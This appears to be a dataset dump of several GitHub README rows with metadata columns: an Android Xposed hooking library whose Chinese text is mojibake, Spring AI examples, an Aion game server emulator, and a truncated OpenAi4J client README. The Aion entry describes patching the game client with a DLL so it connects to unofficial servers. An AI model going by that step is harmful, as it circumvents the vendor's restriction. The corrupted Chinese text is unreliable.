        ); // å³å¯é“¾å¼è°ƒç”¨
        PrefsTool.prefs().getString(); // å³å¯è¯»å–å…±äº«é¦–é€‰é¡¹
        // ......
    }
}
```

- å½“ç„¶ä½ ä¹Ÿå¯ä»¥ç›´æ¥ç»§æ‰¿æœ¬å·¥å…·æ‰“åŒ…å¥½çš„ç±»ã€‚
- // å¼ºçƒˆå»ºè®®ç»§æ‰¿ BaseHC ä½¿ç”¨ï¼

```java
// Hook æ–¹
public class MainTest extends BaseHC {
    @Override
    public void init() {
        // BaseHC ç»§æ‰¿äº† CoreTool å·¥å…·ï¼Œç›´æ¥è°ƒç”¨å³å¯ã€‚
    }

    // å¯é€‰é¡¹ã€‚
    // æ—¶æœºä¸º zygoteã€‚
    // ä½¿ç”¨ initZygote å¿…é¡»åœ¨ hook å…¥å£å¤„åˆå§‹åŒ– HCInit.initStartupParam(startupParam);
    @Override
    public void initZygote(IXposedHookZygoteInit.StartupParam startupParam) {
        findClass(""com.hchen.demo.Main"", classLoader); // æ­¤é˜¶æ®µå‡éœ€è¦ä¼ é€’ classLoader å¦åˆ™æŠ¥é”™ã€‚
    }
}

// æ‰§è¡Œæ–¹
public class RunHook implements IXposedHookLoadPackage, IXposedHookZygoteInit {
    @Override
    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam loadPackageParam) {
        new MainTest().onLoadPackage(); // å³å¯åœ¨ loadPackage é˜¶æ®µæ‰§è¡Œ Hookã€‚
    }

    @Override
    public void initZygote(StartupParam startupParam) {
        new MainTest().onZygote(); // å³å¯åœ¨ initZygote é˜¶æ®µ Hookã€‚
    }
}

```

- æ··æ·†é…ç½®:

```text
// å¦‚æœä½ ä¸éœ€è¦ä½¿ç”¨æ—¥å¿—å¢å¼ºåŠŸèƒ½ï¼Œä¹Ÿå¯ä»¥åªåŠ å…¥ï¼ˆå¯¹äºç»§æ‰¿ BaseHC ä½¿ç”¨çš„æƒ…å†µï¼‰:
-keep class * extends com.hchen.hooktool.BaseHC
 
// å‡å¦‚ä½ å­˜æ”¾ hook æ–‡ä»¶çš„ç›®å½•ä¸º com.hchen.demo.hook
// å¦‚æœéœ€è¦ä½¿ç”¨æ—¥å¿—å¢å¼ºåŠŸèƒ½ï¼Œé‚£ä¹ˆå»ºè®®åŠ å…¥æ··æ·†è§„åˆ™:
// å¦‚æœæœ‰å¤šä¸ªå­˜æ”¾çš„ç›®å½•ï¼Œå»ºè®®éƒ½åˆ†åˆ«åŠ å…¥ã€‚
-keep class com.hchen.demo.hook.**
-keep class com.hchen.demo.hook.**$*

// å¦‚æœæ—¢ä¸ç»§æ‰¿ BaseHC ä½¿ç”¨ï¼Œä¹Ÿä¸ä½¿ç”¨æ—¥å¿—å¢å¼ºåŠŸèƒ½åˆ™ä¸éœ€è¦é…ç½®æ··æ·†è§„åˆ™ã€‚
```

- åˆ°æ­¤å®Œæˆå…¨éƒ¨å·¥ä½œï¼Œå¯ä»¥æ„‰å¿«çš„ä½¿ç”¨äº†ï¼

# ğŸ’¡ é“¾å¼è°ƒç”¨

- æœ¬å·¥å…·æ”¯æŒé“¾å¼è°ƒç”¨ï¼Œä½¿ç”¨ chain() æ–¹æ³•åˆ›å»ºé“¾å¼ã€‚
- è¿™æ˜¯æœ¬å·¥å…·é‡æ„æä¾›çš„å…¨æ–°é“¾å¼æ–¹æ¡ˆï¼Œæ˜¯å¦æ›´ç®€æ´é«˜æ•ˆäº†å‘¢ï¼Ÿ
- ä»£ç ç¤ºä¾‹:

```java
// é“¾å¼è°ƒç”¨
public class MainTest extends BaseHC {
    public void test() {
        // çœ‹ï¼æ˜¯ä¸æ˜¯å¾ˆç®€æ´æ˜“æ‡‚ï¼Ÿ
        chain(""com.hchen.demo"", method(""test"")
                .hook(new IAction() {
                    @Override
                    public void before() {
                        super.before();
                    }
                })

                .anyMethod(""test"")
                .hook(new IAction() {
                    @Override
                    public void after() {
                        super.after();
                    }
                })

                .constructor()
                .returnResult(false)
        );
    }
}
```

# ğŸ”¥ æ³›å‹è½¬æ¢

- ä¼ ç»Ÿ Xposed MethodHookParam çš„å„ç§æ–¹æ³•è¿”å›éƒ½æ˜¯ Objectã€‚ è¿™å°±ä½¿å¾—æˆ‘ä»¬å¿…é¡»æ˜¾æ€§çš„è¿›è¡Œç±»å‹è½¬æ¢æ‰èƒ½ä½¿ç”¨ã€‚
- æœ¬å·¥å…·åˆ™å……åˆ†ä½¿ç”¨æ³›å‹ï¼Œå°±ä¸éœ€è¦æ˜¾æ€§çš„è¿›è¡Œç±»å‹è½¬æ¢å•¦ï¼

```java
public class MainTest extends BaseHC {
    @Override
    public void init() {
        new XC_MethodHook() {
            @Override
            protected void beforeHookedMethod(MethodHookParam param) {
                Context context = (Context) param.thisObject;
                String string = (String) param.args[0];
                param.args[1] = 1;
                String result = (String) XposedHelpers.callMethod(param.thisObject, ""call"",
                        param.thisObject, param.args[0]);
                XposedHelpers.callStaticMethod(XposedHelpers.findClass(""com.demo.Main"", ClassLoader.getSystemClassLoader()),
                        ""callStatic"", param.thisObject, param.args[1]);
                int i = (int) XposedHelpers.getStaticObjectField(XposedHelpers.findClass(""com.demo.Main"", ClassLoader.getSystemClassLoader()),
                        ""field"");
            }
        };

        new IAction() {
            @Override
            public void before() {
                Context context = thisObject(); // æ— éœ€æ˜¾å¼è½¬æ¢
                String string = first(); // æ›´ç¬¦åˆç›´è§‰çš„å‚æ•°è·å– :)
                second(1); // æ›´ç¬¦åˆç›´è§‰çš„å‚æ•°è®¾ç½® :)
                // éé™æ€æœ¬ç±»å†…
                setThisField(""demo"", 1);
                callThisMethod(""method"",...);
                // éé™æ€æœ¬ç±»å¤–
                setField(obj, ""demo"", 1);
                callMethod(obj, ""method"");

                // é™æ€éœ€è¦ class
                callStaticMethod(""com.demo.Main"", ""callStatic"", thisObject(), second());
                int i = getStaticField(""com.demo.Main"", ""field"");
                setStaticField(""com.demo.Main"", ""test"", true);

                removeSelf(); // ä½ å¯è°ƒç”¨æ­¤æ–¹æ³•ï¼Œä½¿å¾—æŒ‚é’©è‡ªå·±å¤±æ•ˆ
                observeCall();  // è§‚å¯Ÿè°ƒç”¨
                getStackTrace(); // è·å–å †æ ˆ
            }
        };
    }
}

```

# ğŸ“Œ å…¨é¢ä¸°å¯Œ

- å·¥å…·æä¾›äº†å…¨é¢ä¸°å¯Œçš„æ–¹æ³•ä¾›ä½ è°ƒç”¨ã€‚
- åŒ…æ‹¬:

----

- ContextTool ç±»:
- æ›´æ–¹ä¾¿çš„è·å– context ã€‚

```java
public class MainTest {
    public void test() {
        // å³å¯æœ€ç®€å•çš„è·å– context
        Context context = ContextTool.getContext(ContextUtils.FLAG_ALL);
    }
}
```

----

- InvokeTool ç±»:
- æ›´æ–¹ä¾¿ç¨³å¥çš„åå°„ç±»ã€‚

```java
public class MainTest {
    public void test() {
        // å³å¯åå°„è°ƒç”¨æ–¹æ³•ï¼Œå…¶ä»–åå°„æ“ä½œåŒç†ã€‚
        InvokeTool.callMethod(InvokeTool.findClass(""com.hchen.demo.Main"",
                getClass().getClassLoader()), ""test"", new Class[]{});
    }
}
```

----

- PropTool ç±»:
- æ›´æ–¹ä¾¿çš„ prop è¯»å–ä¿®æ”¹å·¥å…·ã€‚

```java
public class MainTest {
    public void test() {
        // åªèƒ½åœ¨ç³»ç»Ÿæ¡†æ¶ä¸­è°ƒç”¨æ‰èƒ½è®¾ç½® prop
        PropTool.setProp(""ro.test.prop"", ""1"");
        // è·å–å¯ä»¥éšæ„
        String result = PropTool.getProp(""ro.test.prop"");
    }
}
```

---

- PrefsTool ç±»:
- æä¾› prefs è¯»å–ä¿®æ”¹åŠŸèƒ½ã€‚

```java
// å¯„ç”Ÿåº”ç”¨å†…
public class MainTest extends BaseHC {
    @Override
    public void init() {
        // xprefs æ¨¡å¼ï¼š
        // æ³¨æ„ xprefs æ¨¡å¼ï¼Œå¯„ç”Ÿåº”ç”¨ä¸èƒ½ä¿®æ”¹é…ç½®åªèƒ½è¯»å–ã€‚
        String s = prefs().getString(""test"", ""1"");  // å³å¯è¯»å–
        s = prefs(""myPrefs"").getString(""test"", ""1"");  // å¯æŒ‡å®šè¯»å–æ–‡ä»¶å

        // sprefs æ¨¡å¼ï¼š
        // é…ç½®ä¼šä¿å­˜åˆ°å¯„ç”Ÿåº”ç”¨çš„ç§æœ‰ç›®å½•ï¼Œè¯»å–ä¹Ÿä¼šä»å¯„ç”Ÿåº”ç”¨ç§æœ‰ç›®å½•è¯»å–ã€‚
        prefs(context).editor().putString(""test"", ""1"").commit();
        // å¦‚æœæ²¡æœ‰ç»§æ‰¿ BaseHC å¯ä»¥è¿™æ ·è°ƒç”¨ã€‚
        PrefsTool.prefs(context).editor().putString(""test"", ""2"").commit();
        // æ³¨æ„ sprefs æ¨¡å¼ æ˜¯å’Œ xprefs æ¨¡å¼ç›¸äº’ç‹¬ç«‹çš„ï¼Œå¯å…±åŒå­˜åœ¨ã€‚

        // å¦‚æœä¸æ–¹ä¾¿è·å– context å¯ç”¨ä½¿ç”¨æ­¤æ–¹æ³•ï¼Œå¼‚æ­¥è·å–å¯„ç”Ÿåº”ç”¨ä¸Šä¸‹æ–‡åå†è®¾ç½®ã€‚
        asyncPrefs(new PrefsTool.IAsyncPrefs() {
            @Override
            public void async(Context context) {
                prefs(context).editor().putString(""test"", ""1"").commit();
            }
        });
    }
}

// æ¨¡å—å†…
public static class MainActivity {
    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        // ï¼ï¼ï¼å¦‚æœä½¿ç”¨ xprefs æ¨¡å¼ï¼Œè¯·åœ¨æ¨¡å—ä¸»ç•Œé¢è°ƒç”¨ PrefsTool.prefs(context); åˆå§‹åŒ–ä¸€ä¸‹ï¼Œå¦åˆ™å¯èƒ½ä¸å¯ç”¨ï¼ï¼ï¼
        PrefsTool.prefs(this); // æˆ–
        PrefsTool.prefs(this,/* ä½ è‡ªå·±çš„ prefs åç§° */);

        // ä½¿ç”¨æ–¹æ³•
        prefs(this).editor().putString(""test"", ""1"").commit();
        prefs(this, ""myPrefs"").editor().putString(""test"", ""1"").commit();
    }
}
```

---

- CoreTool ç±»:
- æä¾›å®Œå–„çš„ Hook æ–¹æ³•ï¼
- ç»å¯¹æ»¡è¶³éœ€æ±‚ï¼

----

- DeviceTool ç±»:
- æ–¹ä¾¿çš„è·å–ç³»ç»ŸåŸºæœ¬ä¿¡æ¯ã€‚
- å…·ä½“å‚è§æºä»£ç å’Œæ³¨é‡Šã€‚

----

- ResTool ç±»:
- å°†æ¨¡å—èµ„æºæ³¨å…¥ç›®æ ‡ä½œç”¨åŸŸã€‚
- å…·ä½“å‚è§æºä»£ç ä¸æ³¨é‡Šã€‚

----

- PackagesTool ç±»:
- å¿«é€Ÿè·å–è½¯ä»¶åŒ…ä¿¡æ¯ï¼

----

- BitmapTool ç±»:
- Drawable è½¬ Bitmapã€‚

----

- å…¶ä»–æ›´å¤šç²¾å½©æ­£åœ¨åŠ è½½Â·Â·Â·

# ğŸ’• å·¥å…·ä½¿ç”¨è€…

- ä»¥ä¸‹é¡¹ç›®ä½¿ç”¨äº†æœ¬å·¥å…·ï¼

|      é¡¹ç›®åç§°      |                            é¡¹ç›®é“¾æ¥                            |
|:--------------:|:----------------------------------------------------------:|
| ForegroundPin  |  [ForegroundPin](https://github.com/HChenX/ForegroundPin)  |
| AutoSEffSwitch | [AutoSEffSwitch](https://github.com/HChenX/AutoSEffSwitch) |

- å¦‚æœä½ çš„é¡¹ç›®ä½¿ç”¨äº†æœ¬å·¥å…·ï¼Œå¯ä»¥å‘Šè¯‰æˆ‘ï¼Œæˆ‘å°†ä¼šæŠŠå…¶åŠ å…¥è¡¨æ ¼ã€‚
- æƒ³è¦è¯¦ç»†äº†è§£æœ¬å·¥å…·ä¹Ÿå¯ä»¥å‚è€ƒä¸Šè¿°é¡¹ç›®ï¼Œå¸Œæœ›ç»™ä½ å¸¦æ¥å¸®åŠ©ï¼

# ğŸ“¢ é¡¹ç›®å£°æ˜

- **æœ¬å·¥å…·åŸºäºï¼š**
- [LSPosed](https://github.com/LSPosed/LSPosed)

- ä½¿ç”¨æœ¬å·¥å…·è¯·æ³¨æ˜ã€‚

# ğŸ‰ ç»“å°¾

- æ„Ÿè°¢æ‚¨æ„¿æ„ä½¿ç”¨æœ¬å·¥å…·ï¼Enjoy your day! â™¥ï¸
",17,0,6,1.0,"['tip', 'app']","['tip', 'app']",1.0,"[org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.sonatype.central:central-publishing-maven-plugin]",0.0,1.0,0.0
habuma/spring-ai-examples,main,"# Spring AI Examples

This repository is where I'll commit various examples of using Spring AI.

You can clone this project in its entirety and work with it like that. *Or*
better, use the [SpringCLI](https://docs.spring.io/spring-cli/reference/index.html)
to select individual projects and create them locally.

This repository includes a project-catalog.yml, so you can add it as a project
catalog to Spring CLI like this:

```
% spring project-catalog add spring-ai-examples https://github.com/habuma/spring-ai-examples
```

Then you will be able to see these projects when using `spring project list` and
be able to create projects locally using `spring boot new`. For example, to
create a new local copy of the ""prompts-and-output-parsers"" example, do this:

```
% spring boot new my-project output-parsers com.example.ai
```

This will create the project in a directory named ""my-project"" and will refactor
the package names to be `com.example.ai`.

You can also mix a project's functionality into an existing project by using
`spring boot add`. For example, let's say you already have a Spring Boot project
and want to add the functionality of the ""prompts-and-output-parsers"" project to
it. Here's how you would do that:

```
% spring boot add output-parsers
```

Be aware, however, that the Spring AI examples may build against newer versions
of Spring Boot than your project. If so, your project's original Boot version
will remain unchanged and you may get build or test errors. You'll need to
update your Boot version to the version of the example project to fix the build.

Also note that the project catalog includes one example that is maintained in
separate Git repositories:

- [SpeechAI](https://github.com/habuma/speechai)

Because they're in the project catalog, you can use the Spring CLI to create
those projects as well.

## Want more?

If you like this repository of example, then you're going to love [Spring AI in
Action](https://www.manning.com/books/spring-ai-in-action?a_aid=habuma&a_bid=f205d999&chan=habuma),
now available in Manning's Early Access Program (MEAP). It covers all aspects of
working with Spring AI with a fun example that runs throughout most of the book. 

![Spring AI in Action](https://www.habuma.com/img/SAIiA_small.png ""Spring AI in Action"")
",0,2,2,1.0,"['spring', 'ai', 'example', 'want', 'more']","['spring', 'ai', 'example', 'want', 'more']",14.0,"[org.jetbrains.kotlin:kotlin-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,14.0,0.0
beyond-aion/aion-server,4.8,"![Aion 4.8 Banner](https://github.com/beyond-aion/aion-server/assets/1169307/494205be-399a-4e2e-8435-1f0774d92262)
<div align=""center"">

  ![](https://img.shields.io/badge/dynamic/xml?url=https%3A%2F%2Fgithub.com%2Fbeyond-aion%2Faion-server%2Fraw%2F4.8%2Fgame-server%2Fpom.xml&query=%2F*%5Blocal-name()%3D%22project%22%5D%2F*%5Blocal-name()%3D%22build%22%5D%2F*%5Blocal-name()%3D%22plugins%22%5D%2F*%5Blocal-name()%3D%22plugin%22%5D%5B*%5Blocal-name()%3D%22artifactId%22%5D%2Ftext()%20%3D%20'maven-compiler-plugin'%5D%2F*%5Blocal-name()%3D%22configuration%22%5D%2F*%5Blocal-name()%3D%22release%22%5D%2Ftext()&label=Java%20version)
  [![](https://img.shields.io/github/contributors-anon/beyond-aion/aion-server)](https://htmlpreview.github.io/?https://gist.github.com/neon-dev/ce9729bcacaac31f78771b8521512d0a/raw/contributors.html&repo=beyond-aion/aion-server&title=Beyond%20Aion%20Server%20Contributors)
  ![](https://img.shields.io/github/repo-size/beyond-aion/aion-server)

</div>

# Aion 4.8 Server Emulator

This is the server for the MMORPG *Aion: The Tower of Eternity* that we host for our players.  
Our server emulator is intended to be faithful to the original experience of the official servers of the time, but a few custom features have also been implemented to meet the needs of our community.  
You can read more about it here:
<details>
<summary><b>Motivation and features of this server emulator (click to show)</b></summary>

### Motivation
In the early years of the game, from 2009 onwards, there were larger and more organized development teams. When we started, in 2015, those days were long gone.  
The few people with extensive knowledge about the different Aion-Emu[^1] forks know this already. Aion server emulators are barely functional: Many systems have been left unfinished, some have design problems, and incomplete or incorrect template data is the rule, not the exception. What seems to work at first breaks down when you introduce trivial variables such as players playing the game or running the server for more than a few
hours.  

We wanted to change this and create an emulator this wonderful game deserves.  
The base for our project was Aion-Lightning's server for Aion version 4.7.5, which was considered the best emulator at the time. Unfortunately, while it was less buggy than emulators from other groups, it turned out to be in a similarly terrible state.  
Once we opened the server to our community, many more core issues came to light, all of which led to our decision to prioritize bug fixes and optimizations over features or version updates. So we just updated once, to version 4.8 (again with the help of Aion-Lightning's work), and stuck to our plan.  

### Highlights
The following is a very incomplete list of some notable things we have worked on:

#### Custom features
- PvPvE map with increased AP rates and boss spawns
- Solo instance ""Eternal Challenge"" with a boss using the same skills and tactics like you, based on a deep learning AI
- Customizations to drop lists, QoL improvements, player commands and various PvP and PvE rewards you can read more about [here](https://beyond-aion.com/page/features)

#### Fixes and enhancements
- Fixed geo[^2] related issues like wrong or missing obstacles, incorrect bound calculations, terrain checks, doors, shields, environmental effects, etc.
- Fixed map kicks and other unintended positioning from various skills, some even client-induced (now worked around by the server)
- Implemented missing instances and reworked some
- Fixed hundreds of quests
- Added thousands of missing drops and spawns
- Fixed drop rate calculations and improved the global drop system (removed npc_drop.dat support)
- Fixed duplicate or unintentionally invisible spawns, temporary spawns and added support for temporary spawns in instances and events
- Fixed the event engine and added new features like automatic buffs or config overrides
- Removed, merged or reworked many chat commands, implemented descriptions, common error handling and a permission aware `.help` command
- Implemented true invisibility against anti hide hacks
- Fixed many stat and skill related issues with players and NPCs
- Implemented more AI handler events and controls like queueing of skills
- Fixed countless core bugs of various severities, like wrong chance calculations, login problems or even client crashes
- Fixed memory leaks, concurrency related issues and more, so the server no longer needs to be restarted every few hours (runs nicely for months now)
- Development related:
  - Simplified configuration and added support for more data types, including lists and maps
  - Logging improvements: Added support for Discord webhooks and revised all error logging (no missing stack traces anymore or meaningless messages)
  - Optimized startup time and implemented class file caching for even faster startup if handlers haven't been modified since the last start
  - Continuous optimizations for a more light-weight and more efficient server (removal of unnecessary code or dependencies, refactoring, etc.)
  - Regular Java and dependency updates for the latest improvements and new language features

### Outlook

Fast-forward to today and there are still many unfinished tasks, bugs and ideas for improvements. Too many to even try listing them. A project of this size will never be finished by a few people developing it in their spare time.  
Which is fine, because we enjoy working on it.

</details>

**TL;DR**: A lot of work has been put into improving this emulator. Not only for our players, but also for a better experience when developing.

> [!TIP]  
> If you have questions about [contributing](https://github.com/beyond-aion/aion-server/blob/HEAD/.github/CONTRIBUTING.md) or if you are interested in technical discussions about Aion and its server development, you can join our **development-focused Discord**: [![Discord Join Link](https://img.shields.io/badge/Discord-5865f2?logo=discord&logoColor=white)](https://beyond-aion.com/dev-talk)  
> 
> **Please note that we do not provide any support related to hosting your own server, but you can ask the community for help in [Discussions > Q&A](https://github.com/beyond-aion/aion-server/discussions/categories/q-a)**

## Building
This project uses [Maven](https://maven.apache.org/what-is-maven.html) to manage dependencies. The game server, login server and chat server can be
built using `mvn package` from the root directory.  
The resulting zip files in each server's target folder can be deployed on any system with a suitable JDK and access to a MySQL (or MariaDB) server.  

## Configuration
### Server setup
The servers can be run with the default config after initializing the databases with the *.sql file in each server's sql folder (default DB names
and users can be found in `config/network/database.properties`).  
To whitelist the game server connection to the login server, enter its ID, IP mask and password in the `gameserver` table of the login server
database.  
If you want to change some configs, it's recommended to create the files `config/mycs.properties` (chat server), `config/mygs.properties` (game 
server) and `config/myls.properties` (login server) and put all your custom properties in there. These take precedence over the standard 
*.properties files and will not be modified when updating the server.  

### Game client setup
You can download the game client for this version from [here](https://mega.nz/folder/wxMRXZDS#qMsKJlkyYUNp_TQln2EZlg).  
As it blocks connections to non-official servers, it needs to be patched. This can be done by copying
this [version.dll](https://github.com/beyond-aion/aion-version-dll/releases/latest) into the bin32 and bin64 folders of the game client.  
To run the game, create a file called `start.bat` in the game's root directory with the following content:
```batch
start /affinity 7FFFFFFF """" ""bin64\AION.bin"" -ip:127.0.0.1 -port:2106 -cc:2 -lang:ENG -loginex
```
<sup>The `-lang` parameter accepts any language installed in the l10n folder. The affinity mask ensures that no more than 31 CPU cores are assigned to the
process, as the game client does not support more.</sup>  

## Developing
Import the root directory as a Maven project. If your IDE does not support [EditorConfig](https://editorconfig.org/#pre-installed) natively, install a
plugin for it to ensure a consistent coding style.  
To start a server, create a run/debug configuration with the `*Server` class as the main class. The chat server for example starts from
`ChatServer.java`. The working directory needs to be set to the module directory (`$MODULE_WORKING_DIR$` in IntelliJ).   
If your IDE compiles very slowly, the compiler likely needs more memory. The option is called ""Build process heap size"" in IntelliJ.


[^1]: [Aion-Emu](https://web.archive.org/web/20100128222712/http://aion-emu.com/) was the first server development project for the game and laid the foundation for all the popular server emulators known today.  
[^2]: Geo or geo data is the common term for collision data parsed from the game client. Collision data for this server is created with our [GeoBuilder](https://github.com/beyond-aion/aion-geobuilder).  ",0,0,4,5.0,"['aion', 'server', 'emulator', 'motivation', 'highlight', 'custom', 'feature', 'fix', 'enhancement', 'outlook', 'building', 'configuration', 'server', 'setup', 'game', 'client', 'setup', 'develop']","['server', 'setup', 'aion', 'emulator', 'motivation']",5.0,"[io.github.git-commit-id:git-commit-id-maven-plugin,maven-assembly-plugin,maven-jar-plugin,org.apache.maven.plugins:maven-antrun-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin]",0.0,4.0,1.0
Lambdua/openai4j,main,"![Maven Central](https://img.shields.io/maven-central/v/io.github.lambdua/service?color=blue)

# OpenAi4J

OpenAi4J is an unofficial Java library tailored to facilitate the interaction with OpenAI's GPT models, including the
newest additions such as gpt4-turbo vision,assistant-v2. Originally forked from TheoKanning/openai-java, this library
continues development to incorporate latest API features after the original project's maintenance was discontinued.

[ä¸­æ–‡ä»‹ç»â˜•](README-zh.md)

## Features

- Full support for all OpenAI API models including Completions, Chat, Edits, Embeddings, Audio, Files, Assistants-v2,
  Images, Moderations, Batch, and Fine-tuning.
- Easy-to-use client setup with Retrofit for immediate API interaction.
- Extensive examples and documentation to help you start quickly.
- Customizable setup with environment variable integration for API keys and base URLs.
- Supports synchronous and asynchronous API calls.

This library aims to provide Java developers with a robust tool to integrate OpenAI's powerful capabilities into their
applications effortlessly.

# Quick Start

## Import
### Gradle

`implementation 'io.github.lambdua:<api|client|service>:0.22.3'`
### Maven
```xml

<dependency>
  <groupId>io.github.lambdua</groupId>
  <artifactId>service</artifactId>
    <version>0.22.3</version>
</dependency>
```

## chat with OpenAi model

```java
static void simpleChat() {
  //api-key get from environment variable OPENAI_API_KEY
  OpenAiService service = new OpenAiService(Duration.ofSeconds(30));
  List<ChatMessage> messages = new ArrayList<>();
  ChatMessage systemMessage = new SystemMessage(""You are a cute cat and will speak as such."");
  messages.add(systemMessage);
  ChatCompletionRequest chatCompletionRequest = ChatCompletionRequest.builder()
          .model(""gpt-4o-mini"")
          .messages(messages)
          .n(1)
          .maxTokens(50)
          .build();
  ChatCompletionResult chatCompletion = service.createChatCompletion(chatCompletionRequest);
  System.out.println(chatCompletion.getChoices().get(0).getMessage().getContent());
}
```

# Just Using POJO

If you wish to develop your own client, simply import POJOs from the api module.</br>
Ensure your client adopts snake case naming for compatibility with the OpenAI API.
To utilize pojos, import the api module:

```xml

<dependency>
  <groupId>io.github.lambdua</groupId>
  <artifactId>api</artifactId>
    <version>0.22.3</version>
</dependency>
```

# other examples:

The sample code is all in the `example` package, which includes most of the functional usage. </br>
You can refer to the code in the example package. Below are some commonly used feature usage examples

<details>
<summary>gpt-vision image recognition</summary>

```java
static void gptVision() {
  OpenAiService service = new OpenAiService(Duration.ofSeconds(20));
  final List<ChatMessage> messages = new ArrayList<>();
  final ChatMessage systemMessage = new SystemMessage(""You are a helpful assistant."");
  //Here, the imageMessage is intended for image recognition
  final ChatMessage imageMessage = UserMessage.buildImageMessage(""What's in this image?"",
          ""https://upload.wikimedia.org/wikipedia/commons/thumb/d/dd/Gfp-wisconsin-madison-the-nature-boardwalk.jpg/2560px-Gfp-wisconsin-madison-the-nature-boardwalk.jpg"");
  messages.add(systemMessage);
  messages.add(imageMessage);

  ChatCompletionRequest chatCompletionRequest = ChatCompletionRequest.builder()
          .model(""gpt-4-turbo"")
          .messages(messages)
          .n(1)
          .maxTokens(200)
          .build();
  ChatCompletionChoice choice = service.createChatCompletion(chatCompletionRequest).getChoices().get(0);
  System.out.println(choice.getMessage().getContent());
}
```

</details>

<details>
<summary>Customizing OpenAiService</summary>
OpenAiService is versatile in its setup options, as demonstrated in the `example.ServiceCreateExample` within the example package.

```java
//0 Using the default configuration, read the environment variables OPENAI-API_KEY, OPENAI-API_BASE-URL as the default API_KEY and BASE-URL,
//encourage the use of environment variables to load the OpenAI API key
OpenAiService openAiService0 = new OpenAiService();
//1.Use the default base URL and configure service by default. Here, the base URL (key: OPENAI API BASE URL) will be obtained from the environment variable by default. If not, the default URL will be usedâ€œ https://api.openai.com/v 1/"";
OpenAiService openAiService = new OpenAiService(API_KEY);
//2. Use custom base Url with default configuration of service
OpenAiService openAiService1 = new OpenAiService(API_KEY, BASE_URL);
//3.Custom expiration time
OpenAiService openAiService2 = new OpenAiService(API_KEY, Duration.ofSeconds(10));
//4. More flexible customization
//4.1. customize okHttpClient
OkHttpClient client = new OkHttpClient.Builder()
        //connection pool
        .connectionPool(new ConnectionPool(Runtime.getRuntime().availableProcessors() * 2, 30, TimeUnit.SECONDS))
        //Customized interceptors, such as retry interceptors, log interceptors, load balancing interceptors, etc
        // .addInterceptor(new RetryInterceptor())
        // .addInterceptor(new LogInterceptor())
        // .addInterceptor(new LoadBalanceInterceptor())
        // .proxy(new Proxy(Proxy.Type.HTTP, new InetSocketAddress(""proxyHost"", 8080)))
        .connectTimeout(2, TimeUnit.SECONDS)
        .writeTimeout(3, TimeUnit.SECONDS)
        .readTimeout(10, TimeUnit.SECONDS)
        .protocols(Arrays.asList(Protocol.HTTP_2, Protocol.HTTP_1_1))
        .build();
//4.2 Customizing Retorfit Configuration
Retrofit retrofit = OpenAiService.defaultRetrofit(client, OpenAiService.defaultObjectMapper(), BASE_URL);
OpenAiApi openAiApi = retrofit.create(OpenAiApi.class);
OpenAiService openAiService3 = new OpenAiService(openAiApi);
```

</details>

<details>
<summary>stream chat</summary>

```java
    static void streamChat() {
  //api-key get from environment variable OPENAI_API_KEY
  OpenAiService service = new OpenAiService(Duration.ofSeconds(30));
  List<ChatMessage> messages = new ArrayList<>();
  ChatMessage systemMessage = new SystemMessage(""You are a cute cat and will speak as such."");
  messages.add(systemMessage);
  ChatCompletionRequest chatCompletionRequest = ChatCompletionRequest.builder()
          .model(""gpt-4o-mini"")
          .messages(messages)
          .n(1)
          .maxTokens(50)
          .build();
  service.streamChatCompletion(chatCompletionRequest).blockingForEach(System.out::println);
}
```

</details>

<details>
<summary>Tools</summary>
This library supports both the outdated method of function calls and the current tool-based approach.

First, we define a function object. The definition of a function object is flexible; you can use POJO to define it (
automatically serialized by JSON schema) or use methods like `map` and `FunctionDefinition` to define it. You can refer
to the code in the example package. Here, we define a weather query function object:

```java
public class Weather {
    @JsonPropertyDescription(""City and state, for example: LeÃ³n, Guanajuato"")
    public String location;
    @JsonPropertyDescription(""The temperature unit, can be 'celsius' or 'fahrenheit'"")
    @JsonProperty(required = true)
    public WeatherUnit unit;
}
public enum WeatherUnit {
    CELSIUS, FAHRENHEIT;
}
public static class WeatherResponse {
    public String location;
    public WeatherUnit unit;
    public int temperature;
    public String description;
    
    // constructor
}
```

Next, we declare the function and associate it with an executor, here simulating an API response:

```java
//First, a function to fetch the weather
public static FunctionDefinition weatherFunction() {
    return FunctionDefinition.<Weather>builder()
            .name(""get_weather"")
            .description(""Get the current weather in a given location"")
            .parametersDefinitionByClass(Weather.class)
            //The executor here is a lambda expression that accepts a Weather object and returns a Weather Response object
            .executor(w -> new WeatherResponse(w.location, w.unit, 25, ""sunny""))
            .build();
}
```

Then, the service is used for a chatCompletion request, incorporating the tool:

```java
static void toolChat() {
    OpenAiService service = new OpenAiService(Duration.ofSeconds(30));
    final ChatTool tool = new ChatTool(ToolUtil.weatherFunction());
    final List<ChatMessage> messages = new ArrayList<>();
    final ChatMessage systemMessage = new SystemMessage(""You are a helpful assistant."");
    final ChatMessage userMessage = new UserMessage(""What is the weather in BeiJin?"");
    messages.add(systemMessage);
    messages.add(userMessage);

    ChatCompletionRequest chatCompletionRequest = ChatCompletionRequest.builder()
            .model(""gpt-4o-mini"")
            .messages(messages)
            //Tools is a list; multiple tools can be included
            .tools(Collections.singletonList(tool))
            .toolChoice(ToolChoice.AUTO)
            .n(1)
            .maxTokens(100)
            .build();
    //Request is sent
    ChatCompletionChoice choice = service.createChatCompletion(chatCompletionRequest).getChoices().get(0);
    AssistantMessage toolCallMsg = choice.getMessage();
    ChatToolCall toolCall = toolCallMsg.getToolCalls().get(0);
    System.out.println(toolCall.getFunction());

    messages.add(toolCallMsg);
    messages.add(new ToolMessage(""the weather is fine today."", toolCall.getId()));

    //submit tool call
    ChatCompletionRequest toolCallRequest = ChatCompletionRequest.builder()
            .model(""gpt-4o-mini"")
            .messages(messages)
            .n(1)
            .maxTokens(100)
            .build();
    ChatCompletionChoice toolCallChoice = service.createChatCompletion(toolCallRequest).getChoices().get(0);
    System.out.println(toolCallChoice.getMessage().getContent());
}
```

</details>  

<details>
<summary>stream chat with tool call (support Concurrent tool call)</summary>

```java
void streamChatMultipleToolCalls() {
    final List<FunctionDefinition> functions = Arrays.asList(
            //1. weather query
            FunctionDefinition.<ToolUtil.Weather>builder()
                    .name(""get_weather"")
                    .description(""Get the current weather in a given location"")
